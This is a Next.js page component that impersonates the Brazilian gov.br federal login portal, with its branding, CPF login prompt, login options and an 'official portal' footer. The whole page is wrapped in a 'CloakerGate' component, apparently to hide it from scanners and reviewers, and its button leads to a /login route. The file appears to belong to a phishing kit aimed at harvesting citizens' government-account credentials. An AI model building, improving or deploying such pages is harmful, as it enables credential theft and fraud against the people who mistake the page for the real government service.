import Link from 'next/link';
import CloakerGate from '@/components/CloakerGate';

export default function Home() {
  return (
    <CloakerGate>
      <div className="min-h-screen bg-white flex flex-col">
        {/* Header */}
        <header className="w-full py-2 shadow-md px-4 bg-white">
          <div className="max-w-[1200px] mx-auto py-2 flex justify-between items-center">
            <Link href="/">
              <img src="/govbr.svg" alt="gov.br" width="110" className="cursor-pointer" />
            </Link>

            <div className="text-sm text-gray-800 font-medium hidden lg:flex justify-between gap-8">
              <div className="flex items-center gap-2">
                <svg className="w-4 h-4 text-[#1351B4]" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M10 2a8 8 0 100 16 8 8 0 000-16zM5 10a5 5 0 1110 0 5 5 0 01-10 0z"/>
                </svg>
                Alto Contraste
              </div>

              <div className="flex items-center gap-2">
                <svg className="w-4 h-4 text-[#1351B4]" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M10 2a8 8 0 100 16 8 8 0 000-16z"/>
                </svg>
                VLibras
              </div>
            </div>
          </div>
        </header>

        {/* Main Content */}
        <main className="flex-1 px-4">
          <section className="w-full py-4">
            <div className="max-w-[1200px] mx-auto mt-4 py-4 flex justify-center">
              {/* Imagem lateral - apenas desktop */}
              <div className="hidden lg:block" style={{ maxWidth: '800px' }}>
                <img src="/conta.jpg" alt="" style={{ maxWidth: '97%' }} />
              </div>

              {/* Card de Login */}
              <div className="flex flex-col shadow-lg p-6 rounded-lg text-gray-800 w-full max-w-[390px] bg-white">
                <h5 className="text-gray-800 font-bold text-lg mb-4">
                  Identifique-se no gov.br com:
                </h5>

                <div className="font-medium text-gray-800 mt-4 mb-2 flex items-center">
                  <svg className="w-5 h-5 mr-3 text-[#1351B4]" fill="currentColor" viewBox="0 0 20 20">
                    <path d="M4 4a2 2 0 012-2h8a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V4z"/>
                  </svg>
                  <span>Número do CPF</span>
                </div>

                <div className="text-gray-800 text-sm mt-2 mb-4">
                  Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
                </div>

                <Link
                  href="/login"
                  className="w-full bg-[#1351B4] text-white text-center py-3 rounded-full font-semibold hover:bg-[#0c3d8a] transition-colors mt-4"
                >
                  Acessar minha conta
                </Link>

                <h5 className="mt-6 text-gray-800 font-semibold text-base mb-4 pb-3 border-b border-gray-200">
                  Outras opções de identificação:
                </h5>

                <ul className="font-medium text-base text-gray-800 space-y-4 mb-8">
                  <li className="flex items-center text-green-600">
                    <svg className="w-5 h-5 mr-3" fill="currentColor" viewBox="0 0 20 20">
                      <path d="M7 2a2 2 0 00-2 2v12a2 2 0 002 2h6a2 2 0 002-2V4a2 2 0 00-2-2H7z"/>
                    </svg>
                    <span>Login com o seu banco</span>
                  </li>

                  <li className="flex items-center">
                    <svg className="w-5 h-5 mr-3 text-[#1351B4]" fill="currentColor" viewBox="0 0 20 20">
                      <path d="M3 4a1 1 0 011-1h3a1 1 0 011 1v3a1 1 0 01-1 1H4a1 1 0 01-1-1V4zM3 12a1 1 0 011-1h3a1 1 0 011 1v3a1 1 0 01-1 1H4a1 1 0 01-1-1v-3zM12 3a1 1 0 00-1 1v3a1 1 0 001 1h3a1 1 0 001-1V4a1 1 0 00-1-1h-3zM11 12a1 1 0 011-1h3a1 1 0 011 1v3a1 1 0 01-1 1h-3a1 1 0 01-1-1v-3z"/>
                    </svg>
                    <span>Login com QR code</span>
                  </li>

                  <li className="flex items-center">
                    <svg className="w-5 h-5 mr-3 text-[#1351B4]" fill="currentColor" viewBox="0 0 20 20">
                      <path d="M3 5a2 2 0 012-2h10a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V5z"/>
                    </svg>
                    <span>Seu certificado digital</span>
                  </li>

                  <li className="flex items-center">
                    <svg className="w-5 h-5 mr-3 text-[#1351B4]" fill="currentColor" viewBox="0 0 20 20">
                      <path d="M5.5 16a3.5 3.5 0 01-.369-6.98 4 4 0 117.753-1.977A4.5 4.5 0 1113.5 16h-8z"/>
                    </svg>
                    <span>Seu certificado digital em nuvem</span>
                  </li>
                </ul>

                <div className="font-medium text-gray-800 mt-6 mb-2 text-center">
                  <span className="text-[#1351B4] cursor-pointer hover:underline flex items-center justify-center gap-2">
                    <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-8-3a1 1 0 00-.867.5 1 1 0 11-1.731-1A3 3 0 0113 8a3.001 3.001 0 01-2 2.83V11a1 1 0 11-2 0v-1a1 1 0 011-1 1 1 0 100-2zm0 8a1 1 0 100-2 1 1 0 000 2z" clipRule="evenodd"/>
                    </svg>
                    Está com dúvidas e precisa de ajuda?
                  </span>
                </div>

                <div className="font-medium text-gray-800 mt-4 mb-2 text-center">
                  <span className="text-[#1351B4] cursor-pointer hover:underline">Termo de Uso e Aviso de Privacidade</span>
                </div>
              </div>
            </div>
          </section>
        </main>

        {/* Footer */}
        <footer className="bg-[#071D41] text-white py-8 px-4 mt-auto">
          <div className="max-w-[1200px] mx-auto">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
              <div>
                <img src="/govbr-branco.svg" alt="gov.br" width="120" className="mb-4" />
                <p className="text-sm text-gray-300">
                  Portal oficial do Governo Federal para acesso a serviços públicos digitais.
                </p>
              </div>
              
              <div>
                <h4 className="font-bold mb-4">Links Úteis</h4>
                <ul className="space-y-2 text-sm text-gray-300">
                  <li><a href="#" className="hover:text-white">Sobre o gov.br</a></li>
                  <li><a href="#" className="hover:text-white">Órgãos do Governo</a></li>
                  <li><a href="#" className="hover:text-white">Acessibilidade</a></li>
                  <li><a href="#" className="hover:text-white">Legislação</a></li>
                </ul>
              </div>
              
              <div>
                <h4 className="font-bold mb-4">Contato</h4>
                <ul className="space-y-2 text-sm text-gray-300">
                  <li>Central de Atendimento: 0800-XXX-XXXX</li>
                  <li>Horário: Seg-Sex, 8h às 18h</li>
                </ul>
              </div>
            </div>
            
            <div className="border-t border-gray-600 mt-8 pt-6 text-center text-sm text-gray-400">
              <p>© 2026 - Todos os direitos reservados</p>
              <p className="mt-2">CNPJ: XX.XXX.XXX/0001-XX</p>
            </div>
          </div>
        </footer>
      </div>
    </CloakerGate>
  );
}
